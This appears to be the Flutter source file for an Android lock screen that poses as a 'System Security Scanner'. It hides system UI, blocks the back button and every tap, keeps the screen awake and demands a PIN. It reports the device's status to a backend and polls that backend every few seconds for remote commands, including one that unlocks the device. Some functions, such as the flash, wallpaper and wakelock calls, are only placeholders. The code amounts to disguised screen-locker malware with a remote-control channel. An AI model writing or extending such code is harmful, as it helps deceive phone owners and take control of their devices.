// File: /storage/emulated/0/Download/Tester/lib/screens/lock_screen.dart
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_svg/flutter_svg.dart';
import '../widgets/pin_input.dart';
import '../services/backend_client.dart';
import '../utils/constants.dart';

class LockScreen extends StatefulWidget {
  final String deviceId;
  
  const LockScreen({
    super.key,
    required this.deviceId,
  });

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> 
    with SingleTickerProviderStateMixin {
  late AnimationController _animationController;
  late Animation<double> _shakeAnimation;
  late Animation<double> _fadeAnimation;
  
  String _enteredPin = '';
  bool _isLocked = true;
  bool _isChecking = false;
  int _failedAttempts = 0;
  DateTime? _lockUntil;
  String _statusMessage = 'ENTER PIN TO UNLOCK';
  
  // Overlay properties
  bool _showOverlay = true;

  @override
  void initState() {
    super.initState();
    
    _animationController = AnimationController(
      duration: const Duration(milliseconds: 500),
      vsync: this,
    );
    
    _shakeAnimation = TweenSequence<double>([
      TweenSequenceItem(tween: Tween(begin: 0.0, end: 10.0), weight: 1),
      TweenSequenceItem(tween: Tween(begin: 10.0, end: -10.0), weight: 1),
      TweenSequenceItem(tween: Tween(begin: -10.0, end: 10.0), weight: 1),
      TweenSequenceItem(tween: Tween(begin: 10.0, end: -10.0), weight: 1),
      TweenSequenceItem(tween: Tween(begin: -10.0, end: 0.0), weight: 1),
    ]).animate(_animationController);
    
    _fadeAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(
        parent: _animationController,
        curve: Curves.easeIn,
      ),
    );
    
    // Start checking for commands
    _startCommandChecker();
    
    // Lock the screen
    _lockScreen();
  }

  void _lockScreen() {
    // Enable system UI overlay
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    
    // Prevent screen from turning off
    WakelockPlus.enable();
    
    setState(() {
      _isLocked = true;
      _showOverlay = true;
    });
    
    // Notify backend that device is locked
    BackendClient.sendStatusUpdate(
      deviceId: widget.deviceId,
      status: 'locked',
    );
  }

  void _unlockScreen() {
    // Restore system UI
    SystemChrome.setEnabledSystemUIMode(
      SystemUiMode.manual,
      overlays: SystemUiOverlay.values,
    );
    
    // Allow screen to turn off
    WakelockPlus.disable();
    
    setState(() {
      _isLocked = false;
      _showOverlay = false;
      _statusMessage = 'DEVICE UNLOCKED';
    });
    
    // Notify backend
    BackendClient.sendStatusUpdate(
      deviceId: widget.deviceId,
      status: 'unlocked',
    );
  }

  Future<void> _startCommandChecker() async {
    // Periodically check for commands from backend
    while (_isLocked) {
      await Future.delayed(const Duration(seconds: 5));
      
      if (!mounted) break;
      
      try {
        final commands = await BackendClient.checkCommands(widget.deviceId);
        
        if (commands.isNotEmpty) {
          for (var command in commands) {
            await _executeCommand(command);
          }
        }
      } catch (e) {
        debugPrint('Command check error: $e');
      }
    }
  }

  Future<void> _executeCommand(Map<String, dynamic> command) async {
    final cmd = command['command'];
    final params = command['parameters'] ?? {};
    
    switch (cmd) {
      case 'toggle_flash':
        await _toggleFlash();
        break;
      case 'change_wallpaper':
        final imageUrl = params['image_url'] as String?;
        if (imageUrl != null) {
          await _changeWallpaper(imageUrl);
        }
        break;
      case 'unlock_device':
        // Check if PIN is provided
        final pin = params['pin'] as String?;
        if (pin == Constants.unlockPin) {
          _unlockScreen();
        }
        break;
      default:
        debugPrint('Unknown command: $cmd');
    }
    
    // Send response to backend
    await BackendClient.sendResponse(
      deviceId: widget.deviceId,
      commandId: command['id'] as String,
      success: true,
    );
  }

  Future<void> _toggleFlash() async {
    // This would require torch/flashlight plugin
    // For demo, just log it
    debugPrint('Flash toggled');
  }

  Future<void> _changeWallpaper(String imageUrl) async {
    // This would require wallpaper plugin
    // For demo, just log it
    debugPrint('Wallpaper changed to: $imageUrl');
  }

  void _onPinEntered(String pin) async {
    if (_isChecking || _lockUntil != null) return;
    
    setState(() {
      _enteredPin = pin;
      _isChecking = true;
      _statusMessage = 'VERIFYING PIN...';
    });
    
    // Simulate network delay
    await Future.delayed(const Duration(milliseconds: 500));
    
    if (pin == Constants.unlockPin) {
      // Correct PIN
      _unlockScreen();
      
      // Notify backend
      await BackendClient.sendStatusUpdate(
        deviceId: widget.deviceId,
        status: 'pin_verified',
      );
    } else {
      // Wrong PIN
      _failedAttempts++;
      
      if (_failedAttempts >= 3) {
        // Lock for 30 seconds
        _lockUntil = DateTime.now().add(const Duration(seconds: 30));
        
        setState(() {
          _statusMessage = 'LOCKED FOR 30 SECONDS';
        });
        
        // Start countdown
        _startLockCountdown();
      } else {
        // Shake animation
        _animationController.reset();
        _animationController.forward();
        
        setState(() {
          _statusMessage = 'WRONG PIN - ${3 - _failedAttempts} ATTEMPTS LEFT';
          _enteredPin = '';
          _isChecking = false;
        });
      }
      
      // Haptic feedback
      HapticFeedback.heavyImpact();
    }
  }

  void _startLockCountdown() {
    Future.doWhile(() async {
      if (_lockUntil == null || !mounted) return false;
      
      final now = DateTime.now();
      final remaining = _lockUntil!.difference(now);
      
      if (remaining.inSeconds <= 0) {
        setState(() {
          _lockUntil = null;
          _failedAttempts = 0;
          _enteredPin = '';
          _isChecking = false;
          _statusMessage = 'ENTER PIN TO UNLOCK';
        });
        return false;
      }
      
      setState(() {
        _statusMessage = 'LOCKED FOR ${remaining.inSeconds}s';
      });
      
      await Future.delayed(const Duration(seconds: 1));
      return true;
    });
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        // Prevent back button when locked
        return !_isLocked;
      },
      child: Stack(
        children: [
          // Background
          Container(
            decoration: const BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [
                  Color(0xFF0A0E21),
                  Color(0xFF151A30),
                ],
              ),
            ),
          ),
          
          // Content (only visible when not showing overlay)
          if (!_showOverlay)
            Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  SvgPicture.asset(
                    'assets/icons/unlock.svg',
                    height: 120,
                    color: Constants.successColor,
                  ),
                  const SizedBox(height: 30),
                  const Text(
                    'DEVICE UNLOCKED',
                    style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 32,
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 3,
                    ),
                  ),
                  const SizedBox(height: 20),
                  Text(
                    'Security Scanner is running in background',
                    style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 16,
                      color: Constants.subtitleColor,
                    ),
                    textAlign: TextAlign.center,
                  ),
                  const SizedBox(height: 40),
                  ElevatedButton(
                    onPressed: () {
                      setState(() {
                        _showOverlay = true;
                        _isLocked = true;
                      });
                      _lockScreen();
                    },
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Constants.primaryColor,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                      padding: const EdgeInsets.symmetric(
                        horizontal: 32,
                        vertical: 16,
                      ),
                    ),
                    child: const Text(
                      'LOCK DEVICE',
                      style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 16,
                        letterSpacing: 2,
                      ),
                    ),
                  ),
                ],
              ),
            ),
          
          // Lock Overlay
          if (_showOverlay)
            AnimatedBuilder(
              animation: _shakeAnimation,
              builder: (context, child) {
                return Transform.translate(
                  offset: Offset(_shakeAnimation.value, 0),
                  child: Container(
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        begin: Alignment.topCenter,
                        end: Alignment.bottomCenter,
                        colors: [
                          const Color(0xFF0A0E21).withOpacity(0.95),
                          const Color(0xFF151A30).withOpacity(0.95),
                        ],
                      ),
                    ),
                    child: SafeArea(
                      child: Padding(
                        padding: const EdgeInsets.all(24),
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            // Lock Icon
                            SvgPicture.asset(
                              'assets/icons/lock_big.svg',
                              height: 120,
                              color: _lockUntil != null 
                                  ? Constants.dangerColor 
                                  : Constants.primaryColor,
                            ),
                            
                            const SizedBox(height: 30),
                            
                            // Status Message
                            Text(
                              _statusMessage,
                              style: TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 20,
                                color: _lockUntil != null 
                                    ? Constants.dangerColor 
                                    : Colors.white,
                                fontWeight: FontWeight.bold,
                                letterSpacing: 2,
                              ),
                              textAlign: TextAlign.center,
                            ),
                            
                            const SizedBox(height: 10),
                            
                            // Subtitle
                            Text(
                              'System Security Scanner - Device ID: ${widget.deviceId}',
                              style: TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 12,
                                color: Constants.subtitleColor,
                                letterSpacing: 1.5,
                              ),
                              textAlign: TextAlign.center,
                            ),
                            
                            const SizedBox(height: 40),
                            
                            // PIN Input
                            PinInput(
                              length: 3,
                              onCompleted: _onPinEntered,
                              enabled: _lockUntil == null && !_isChecking,
                            ),
                            
                            const SizedBox(height: 30),
                            
                            // PIN Hint
                            Text(
                              'PIN: ${'•' * Constants.unlockPin.length}',
                              style: TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 12,
                                color: Constants.subtitleColor.withOpacity(0.6),
                                letterSpacing: 2,
                              ),
                            ),
                            
                            const SizedBox(height: 20),
                            
                            // Failed Attempts
                            if (_failedAttempts > 0)
                              Row(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  Icon(
                                    Icons.warning,
                                    color: Constants.dangerColor,
                                    size: 16,
                                  ),
                                  const SizedBox(width: 8),
                                  Text(
                                    'Failed attempts: $_failedAttempts',
                                    style: TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 12,
                                      color: Constants.dangerColor,
                                    ),
                                  ),
                                ],
                              ),
                            
                            const SizedBox(height: 40),
                            
                            // Emergency Info
                            Container(
                              padding: const EdgeInsets.all(16),
                              decoration: BoxDecoration(
                                color: Constants.cardColor.withOpacity(0.5),
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(
                                  color: Constants.warningColor.withOpacity(0.3),
                                ),
                              ),
                              child: Column(
                                children: [
                                  Icon(
                                    Icons.security,
                                    color: Constants.warningColor,
                                    size: 24,
                                  ),
                                  const SizedBox(height: 12),
                                  const Text(
                                    'SECURITY OVERLAY ACTIVE',
                                    style: TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 10,
                                      color: Colors.white,
                                      letterSpacing: 2,
                                    ),
                                  ),
                                  const SizedBox(height: 8),
                                  Text(
                                    'Device protected by System Security Scanner',
                                    style: TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 10,
                                      color: Constants.subtitleColor,
                                    ),
                                    textAlign: TextAlign.center,
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ),
                );
              },
            ),
          
          // System UI Blocker
          if (_isLocked)
            GestureDetector(
              onTap: () {
                // Prevent any taps from doing anything
                HapticFeedback.mediumImpact();
              },
              behavior: HitTestBehavior.opaque,
            ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _animationController.dispose();
    // Make sure to disable wakelock
    try {
      WakelockPlus.disable();
    } catch (_) {}
    super.dispose();
  }
}

// Wakelock helper (placeholder)
class WakelockPlus {
  static void enable() {
    // In real app, use wakelock package
  }
  
  static void disable() {
    // In real app, use wakelock package
  }
}
